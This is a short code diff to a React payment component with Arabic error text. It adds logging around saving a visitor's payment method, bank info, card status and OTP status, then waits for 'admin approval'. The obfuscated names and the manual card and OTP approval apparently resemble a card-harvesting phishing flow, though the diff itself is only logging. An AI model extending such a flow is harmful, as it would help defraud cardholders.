@@ -244,6 +244,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
       
+      console.log('[Payment] Starting payment process for visitor:', visitorID)
+      
       await secureAddData({
         id: visitorID,
         paymentMethod: selectedPaymentMethod,
@@ -259,6 +261,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         cardStatus: "waiting",
         otpStatus: "pending"
       })
+      
+      console.log('[Payment] Data saved successfully')
 
       await addToHistory(visitorID, "_t1", {
         _v1,
@@ -268,12 +272,15 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         _v2,
         bankInfo
       }, "pending")
+      
+      console.log('[Payment] History entry added successfully')
 
       setIsWaitingAdmin(true)
+      console.log('[Payment] Waiting for admin approval')
     } catch (error) {
-      console.error("Payment error:", error)
+      console.error("[Payment] Payment error:", error)
       toast.error("حدث خطأ", {
-        description: "فشلت معالجة الدفع. يرجى المحاولة مرة أخرى",
+        description: `فشلت معالجة الدفع: ${error instanceof Error ? error.message : 'خطأ غير معروف'}`,
         duration: 5000
       })
     }
